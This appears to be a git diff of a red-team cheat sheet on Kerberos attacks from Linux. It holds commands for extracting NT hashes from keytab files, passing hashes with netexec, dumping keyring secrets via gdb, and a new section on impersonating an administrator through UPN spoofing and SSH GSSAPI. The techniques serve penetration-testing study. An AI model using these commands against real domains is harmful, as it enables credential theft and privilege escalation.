@@ -64,7 +64,7 @@ klist -k /etc/krb5.keytab
 
 The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure.
 
-Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
+Use [microsoft/klist](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/klist) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
 
 ```powershell
 $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
@@ -77,7 +77,7 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [...]
 ```
 
-On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+On Linux you can use [sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
 
 ```powershell
 $ python3 keytabextract.py krb5.keytab 
@@ -88,7 +88,7 @@ $ python3 keytabextract.py krb5.keytab
         NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
-On macOS you can use `bifrost`.
+On macOS you can use [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost).
 
 ```powershell
 ./bifrost -action dump -source keytab -path test
@@ -98,7 +98,7 @@ Connect to the machine using the account and the hash with CME.
 
 ```powershell
 $ netexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
-         10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
+10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
 
 ## Extract accounts from /etc/sssd/sssd.conf
@@ -169,8 +169,63 @@ Back to GDB:
 call system("keyctl print 689325199 > /tmp/output")
 ```
 
+## SSH GSSAPI
+
+GSSAPI (Generic Security Services Application Program Interface) is an API that provides security services (such as authentication) and acts as an abstraction layer for different security mechanisms, such as Kerberos.
+
+**Requirements**:
+
+* Write permission on **Public-Information** field
+* SSH server supporting GSSAPI authentication: [CCob/gssapi-abuse](https://github.com/CCob/gssapi-abuse)
+
+    ```ps1
+    ./gssapi-abuse.py -d grandline.local enum -u username -p 'P@ssw0rd'
+    ```
+
+**Methodology**:
+
+Since MIT Kerberos doesn't verify the PAC, controlling a domain account and altering its UPN allows us to masquerade as a different user.
+
+* Modify the `userPrincipalName` inside the **Public-Information** field.
+
+    ```ps1
+    bloodyAD --host "dc1.domain.local" -d "domain.local" -u 'username' -p 'P@ssw0rd' set object username userPrincipalName -v 'administrator'  
+    ```
+
+* Request a ticket with the `NT_ENTERPRISE` principal because it searches for `userPrincipalName` before `samAccountName` in the ticket.
+
+    ```ps1
+    getTGT.py -dc-ip "10.10.10.10" "domain.local"/"username":'P@ssw0rd' -principalType NT_ENTERPRISE
+    .\Rubeus.exe asktgt /user:Administrator /password:Password /principalType:enterprise
+    ```
+
+* Edit `/etc/krb5.conf` to authenticate to the Linux host via GSSAPI.
+
+    ```yaml
+    [libdefaults]
+        default_realm = DOMAIN.LOCAL
+
+    [realms]
+        DOMAIN.LOCAL = {
+                kdc = dc1.domain.local
+        }
+
+    [domain_realm]
+        .domain.local = DOMAIN.LOCAL
+        domain.local = DOMAIN.LOCAL
+    ```
+
+* SSH connection
+
+    ```ps1
+    export KRB5CCNAME=username.ccache
+    ssh -vv -K username@domain.local@linux.domain.local
+    ```
+
 ## References
 
-* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
-* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
 * [20.4. Caching Kerberos Passwords - Red Hat Customer Portal](https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/identity_management_guide/kerberos-pwd-cache)
+* [A broken marriage. Abusing mixed vendor Kerberos stacks - Ceri Coburn - August 25, 2023](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/?ref=rayanle.cat)
+* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
+* [Hack'in 2025 - One Directory - rayanlecat - June 25, 2025](https://www.rayanle.cat/hackin-2025-one-directory/)
+* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
